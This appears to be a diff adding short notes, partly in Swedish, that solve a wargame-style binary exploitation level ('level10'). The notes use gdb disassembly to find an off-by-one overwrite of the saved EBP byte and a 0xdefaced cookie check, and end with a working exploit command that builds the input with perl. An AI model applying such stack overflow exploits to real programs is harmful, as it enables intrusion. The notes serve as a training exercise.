@@ -1,0 +1,13 @@
+# gdb ./level10
+# disas f
+0x0804841e <f+3>:	sub    $0x128,%esp
+
+0x128 = 296 bytes stackframe för f()
+Inputbuffer på 297 bytes skriver över EBPs sista byte
+
+# disas main
+0x080484c5 <main+59>:	cmpl   $0xdefaced,-0xc(%ebp)
+
+cookie i main() kontrolleras alltså mot EBP-12 (dvs en adress i vår inputbuffer)
+
+# ./level10 `perl -e 'print "\xed\xac\xef\x0d"x74,"\x40"'`
